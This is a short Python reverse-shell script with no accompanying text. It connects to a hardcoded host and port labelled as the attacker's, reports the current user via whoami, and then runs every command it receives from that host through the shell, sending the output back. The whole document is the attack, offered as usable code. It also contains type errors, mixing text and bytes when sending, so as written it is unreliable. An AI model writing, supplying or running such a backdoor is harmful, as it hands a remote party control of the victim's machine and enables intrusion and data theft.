import socket, subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444)) # Attacker's IP and Port


os= subprocess.check_output("whoami",shell=True).decode()

s.send(os +"\n"
       
       )
while True:
    
    cmd = s.recv(1024).decode()    
    
    if cmd.lower()=="exit":
       
       
        break
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    output = proc.stdout.read()
    s.send(output + "\n")